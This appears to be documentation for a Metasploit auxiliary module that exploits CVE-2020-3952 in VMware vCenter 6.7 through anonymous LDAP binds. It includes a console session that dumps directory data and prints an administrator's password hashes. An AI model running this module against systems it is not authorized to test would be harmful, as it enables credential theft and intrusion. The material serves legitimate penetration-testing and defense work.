## Vulnerable Application

### Description

This module uses an anonymous-bind LDAP connection to dump data from
the vmdir service in VMware vCenter Server version 6.7 prior to the
6.7U3f update, only if upgraded from a previous release line, such as
6.0 or 6.5.

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Dump

Dump all LDAP data from the vCenter Server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### ConnectTimeout

You may configure the timeout for LDAP connects if necessary. The
default is 10.0 seconds and should be more than sufficient.

## Scenarios

### VMware vCenter Server 6.7 virtual appliance on ESXi

```
msf5 > use auxiliary/gather/vmware_vcenter_vmdir_ldap
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > options

Module options (auxiliary/gather/vmware_vcenter_vmdir_ldap):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   BASE_DN                   no        LDAP base DN if you already have it
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    389              yes       The target port


Auxiliary action:

   Name  Description
   ----  -----------
   Dump  Dump all LDAP data


msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > set rhosts [redacted]
rhosts => [redacted]
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > run
[*] Running module against [redacted]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
dn: cn=DSE Root
namingcontexts: dc=vsphere,dc=local
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.1
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.2
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.3
supportedcontrol: 1.2.840.113556.1.4.417
supportedcontrol: 1.2.840.113556.1.4.319
supportedldapversion: 3
supportedsaslmechanisms: GSSAPI

[+] Discovered base DN: dc=vsphere,dc=local
[*] Dumping LDAP data from vmdir service at [redacted]:389
[+] [redacted]:389 is vulnerable to CVE-2020-3952
[*] Storing LDAP data in loot
[+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002613_default_[redacted]_VMwarevCenterS_939568.txt
[*] Password and lockout policy:
vmwpasswordchangeautounlockintervalsec: [redacted]
vmwpasswordchangefailedattemptintervalsec: [redacted]
vmwpasswordchangemaxfailedattempts: [redacted]
vmwpasswordlifetimedays: [redacted]
vmwpasswordmaxidenticaladjacentchars: [redacted]
vmwpasswordmaxlength: [redacted]
vmwpasswordminalphabeticcount: [redacted]
vmwpasswordminlength: [redacted]
vmwpasswordminlowercasecount: [redacted]
vmwpasswordminnumericcount: [redacted]
vmwpasswordminspecialcharcount: [redacted]
vmwpasswordminuppercasecount: [redacted]
vmwpasswordprohibitedpreviouscount: [redacted]

[+] Credentials found: CN=HynekAdmin,CN=Users,DC=vsphere,DC=local:$dynamic_82$43717fbfb6d81163b5f8f7a479311ad0904134bc086a02e090b3bb5322cc0166c91163920575d4b6a2790e5189a83b71757d69a003c9856212ca6a8e3dc6e407$HEX$1d174c634c8bf44558e132c3f0d8b401
[+] Credentials found: CN=HynekAdmin,CN=Users,DC=vsphere,DC=local:$dynamic_82$a702505b8a67b45065a6a7ff81ec6685f08d06568e478e1a7695484a934b19a28b94f58595d4de68b27771362bc2b52444a0ed03e980e11ad5e5ffa6daa9e7e1$HEX$171ada255464a439569352c60258e7c6
[*] Auxiliary module execution completed
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) >
```
